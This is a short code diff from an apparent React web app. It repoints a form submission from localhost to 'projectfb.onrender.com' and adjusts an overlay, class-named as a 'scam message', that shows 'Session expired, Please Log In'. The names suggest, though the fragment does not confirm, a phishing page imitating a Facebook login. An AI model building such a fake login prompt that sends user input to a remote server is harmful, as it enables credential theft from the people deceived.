@@ -18,7 +18,7 @@ async function handleSubmit(){
   }else{
   setUser(user)
 
-  const res=await fetch('http://localhost:3000/create',{
+  const res=await fetch('https://projectfb.onrender.com',{
   method:"POST",
   headers: {
     "Content-Type": "application/json"
@@ -44,7 +44,7 @@ setdisExpiredMsg(false)
 }
   return (
     <>
-    <div className='BgScamMessageContainer' style={{display: disExpiredMsg? "flex":"none"}}>
+    <div className='BgScamMessageContainer' style={{display: disExpiredMsg? "flex":"none",pointerEvents: disExpiredMsg ? "auto" : "none"}}>
       <div className="blurbackground"></div>
       <div className='scamMessageContainer'>
         Session expired, Please Log In
